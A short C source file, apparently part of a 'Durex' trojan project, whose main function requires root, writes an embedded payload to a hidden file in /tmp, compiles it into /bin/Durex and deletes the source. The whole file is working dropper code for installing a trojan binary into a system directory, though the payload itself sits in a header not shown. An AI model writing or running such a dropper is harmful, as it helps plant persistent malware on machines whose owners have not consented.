#include "durex.h"

int create_trojan()
{
	int fd;

	if ((fd = open("/tmp/.compyle.c", O_RDWR | O_CREAT | O_TRUNC)) < 0 )
		return (1);
	write(fd, code, sizeof(code) - 1);
	system("gcc /tmp/.compyle.c -o /bin/Durex; rm -f /tmp/.compyle");
	return (0);
}

int main()
{
	uid_t id = getuid(); 
	if (id)//check if launched as root
		return (1);
	puts("sel-melc");
	if (create_trojan())
		return (1);
	return (0);
}